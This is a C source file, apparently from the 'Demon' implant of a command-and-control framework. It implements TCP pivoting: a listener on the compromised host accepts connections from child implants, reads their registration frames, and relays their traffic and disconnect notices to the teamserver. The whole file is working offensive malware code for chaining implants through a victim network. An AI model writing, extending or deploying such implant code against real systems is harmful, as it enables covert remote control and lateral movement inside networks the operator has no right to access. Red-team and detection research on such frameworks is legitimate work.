#include <Demon.h>

#include <common/Macros.h>
#include <core/MiniStd.h>
#include <core/Command.h>
#include <core/Package.h>

PTCP_PIVOT_DATA TcpPivotGet( DWORD AgentId )
{
    PTCP_PIVOT_DATA List = Instance->TcpPivots;

    while ( List ) {
        if ( List->DemonID == AgentId )
            return List;
        List = List->Next;
    }

    return NULL;
}

BOOL TcpPivotRemove( DWORD AgentId )
{
    PTCP_PIVOT_DATA List = Instance->TcpPivots;
    PTCP_PIVOT_DATA Prev = NULL;

    while ( List ) {
        if ( List->DemonID == AgentId ) {
            if ( Prev )
                Prev->Next = List->Next;
            else
                Instance->TcpPivots = List->Next;

            Instance->Win32.closesocket( List->Socket );

            MemSet( List, 0, sizeof( TCP_PIVOT_DATA ) );
            Instance->Win32.LocalFree( List );

            return TRUE;
        }
        Prev = List;
        List = List->Next;
    }

    return FALSE;
}

/* Read exactly Len bytes from a blocking socket. */
static BOOL TcpRecvAll( SOCKET Sock, PBYTE Buf, DWORD Len )
{
    DWORD Read = 0;
    INT   Got  = 0;

    while ( Read < Len ) {
        Got = Instance->Win32.recv( Sock, (PCHAR)( Buf + Read ), (INT)( Len - Read ), 0 );
        if ( Got == SOCKET_ERROR || Got == 0 )
            return FALSE;
        Read += (DWORD)Got;
    }

    return TRUE;
}

/* Send a length-prefixed (BE uint32) frame to a TCP pivot child. */
BOOL TcpPivotWrite( DWORD AgentId, PBYTE Data, DWORD Length )
{
    PTCP_PIVOT_DATA Pivot = TcpPivotGet( AgentId );
    UINT32          BELen = 0;

    if ( ! Pivot ) {
        PRINTF( "TcpPivotWrite: pivot %x not found\n", AgentId );
        return FALSE;
    }

    BELen = __builtin_bswap32( Length );

    if ( Instance->Win32.send( Pivot->Socket, (PCHAR)&BELen, 4, 0 ) == SOCKET_ERROR )
        return FALSE;

    if ( Instance->Win32.send( Pivot->Socket, (PCHAR)Data, (INT)Length, 0 ) == SOCKET_ERROR )
        return FALSE;

    return TRUE;
}

/* Start a non-blocking TCP server on the given port. */
BOOL TcpPivotListen( DWORD Port )
{
    SOCKET      Server = INVALID_SOCKET;
    SOCKADDR_IN Addr   = { 0 };
    ULONG       Mode   = 1;

    if ( ! InitWSA() )
        return FALSE;

    Server = Instance->Win32.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
    if ( Server == INVALID_SOCKET ) {
        PRINTF( "WSASocketA failed: %d\n", Instance->Win32.WSAGetLastError() );
        return FALSE;
    }

    /* Non-blocking accept loop */
    Instance->Win32.ioctlsocket( Server, FIONBIO, &Mode );

    Addr.sin_family      = AF_INET;
    Addr.sin_addr.s_addr = INADDR_ANY;
    Addr.sin_port        = __builtin_bswap16( (UINT16)Port );

    if ( Instance->Win32.bind( Server, (PSOCKADDR)&Addr, sizeof( Addr ) ) == SOCKET_ERROR ) {
        PRINTF( "bind failed: %d\n", Instance->Win32.WSAGetLastError() );
        Instance->Win32.closesocket( Server );
        return FALSE;
    }

    if ( Instance->Win32.listen( Server, 10 ) == SOCKET_ERROR ) {
        PRINTF( "listen failed: %d\n", Instance->Win32.WSAGetLastError() );
        Instance->Win32.closesocket( Server );
        return FALSE;
    }

    Instance->TcpPivotServer = Server;
    PRINTF( "TCP pivot listening on port %d\n", Port );
    return TRUE;
}

/*
 * Called every beacon cycle.
 * 1. Accept any new child connections, read their registration frame, notify TS.
 * 2. Read pending frames from each connected child, relay to TS.
 */
VOID TcpPivotPush( VOID )
{
    PTCP_PIVOT_DATA List     = Instance->TcpPivots;
    ULONG32         NumLoops = 0;

    /* Accept new connections (non-blocking) */
    if ( Instance->TcpPivotServer ) {
        SOCKADDR_IN ClientAddr = { 0 };
        INT         AddrLen    = sizeof( ClientAddr );
        SOCKET      Client     = Instance->Win32.accept( Instance->TcpPivotServer, (PSOCKADDR)&ClientAddr, &AddrLen );

        if ( Client != INVALID_SOCKET ) {
            UINT32   FrameLen = 0;
            ULONG    Avail    = 0;
            ULONG    Mode     = 1;
            PBYTE    FrameBuf = NULL;

            /* Set client to blocking for initial registration read */
            Mode = 0;
            Instance->Win32.ioctlsocket( Client, FIONBIO, &Mode );

            /* Read 4-byte BE length prefix */
            if ( TcpRecvAll( Client, (PBYTE)&FrameLen, 4 ) ) {
                FrameLen = __builtin_bswap32( FrameLen );
                FrameBuf = Instance->Win32.LocalAlloc( LPTR, FrameLen );

                if ( TcpRecvAll( Client, FrameBuf, FrameLen ) ) {
                    UINT32          DemonID = PivotParseDemonID( FrameBuf, FrameLen );
                    PTCP_PIVOT_DATA Entry   = Instance->Win32.LocalAlloc( LPTR, sizeof( TCP_PIVOT_DATA ) );
                    PPACKAGE        Package = NULL;

                    Entry->DemonID = DemonID;
                    Entry->Socket  = Client;
                    Entry->Next    = Instance->TcpPivots;
                    Instance->TcpPivots = Entry;

                    /* Back to non-blocking for subsequent reads */
                    Mode = 1;
                    Instance->Win32.ioctlsocket( Client, FIONBIO, &Mode );

                    /* Notify teamserver: child connected */
                    Package = PackageCreate( DEMON_COMMAND_PIVOT );
                    PackageAddInt32( Package, DEMON_PIVOT_TCP_CONNECT );
                    PackageAddInt32( Package, TRUE );
                    PackageAddBytes( Package, FrameBuf, FrameLen );
                    PackageTransmit( Package );
                } else {
                    Instance->Win32.closesocket( Client );
                }

                DATA_FREE( FrameBuf, FrameLen );
            } else {
                Instance->Win32.closesocket( Client );
            }
        }
    }

    /* Read from all connected children */
    while ( List ) {
        ULONG  BytesAvail = 0;
        BOOL   Dead       = FALSE;

        NumLoops = 0;

        do {
            if ( Instance->Win32.ioctlsocket( List->Socket, FIONREAD, &BytesAvail ) == SOCKET_ERROR ) {
                Dead = TRUE;
                break;
            }

            if ( BytesAvail >= sizeof( UINT32 ) ) {
                UINT32   PeekLen  = 0;
                UINT32   FrameLen = 0;
                PBYTE    Buf      = NULL;
                PPACKAGE Package  = NULL;

                /* Peek the 4-byte length prefix without consuming it so we can
                   check that the full frame has arrived before reading anything.
                   The socket is non-blocking: a partial frame would make the
                   body TcpRecvAll return WSAEWOULDBLOCK → Dead=TRUE incorrectly. */
                if ( Instance->Win32.recv( List->Socket, (PCHAR)&PeekLen, 4, MSG_PEEK ) != 4 ) {
                    break;
                }

                FrameLen = __builtin_bswap32( PeekLen );

                /* Re-query so BytesAvail reflects what arrived after the peek. */
                if ( Instance->Win32.ioctlsocket( List->Socket, FIONREAD, &BytesAvail ) == SOCKET_ERROR ) {
                    Dead = TRUE;
                    break;
                }

                /* Wait until the full frame (length prefix + body) has arrived. */
                if ( BytesAvail < sizeof( UINT32 ) + FrameLen ) {
                    break;
                }

                /* Now consume the length prefix. */
                if ( ! TcpRecvAll( List->Socket, (PBYTE)&PeekLen, 4 ) ) {
                    Dead = TRUE;
                    break;
                }

                Buf = Instance->Win32.LocalAlloc( LPTR, FrameLen );

                if ( TcpRecvAll( List->Socket, Buf, FrameLen ) ) {
                    Package = PackageCreate( DEMON_COMMAND_PIVOT );
                    PackageAddInt32( Package, DEMON_PIVOT_TCP_COMMAND );
                    PackageAddBytes( Package, Buf, FrameLen );
                    PackageTransmit( Package );
                } else {
                    Dead = TRUE;
                }

                DATA_FREE( Buf, FrameLen );
                NumLoops++;
            } else {
                break;
            }

        } while ( NumLoops < MAX_TCP_PACKETS_PER_LOOP && ! Dead );

        if ( Dead ) {
            DWORD           DemonID = List->DemonID;
            PTCP_PIVOT_DATA Next    = List->Next;
            PPACKAGE        Package = NULL;

            TcpPivotRemove( DemonID );

            Package = PackageCreate( DEMON_COMMAND_PIVOT );
            PackageAddInt32( Package, DEMON_PIVOT_TCP_DISCONNECT );
            PackageAddInt32( Package, TRUE );
            PackageAddInt32( Package, DemonID );
            PackageTransmit( Package );

            List = Next;
        } else {
            List = List->Next;
        }
    }
}
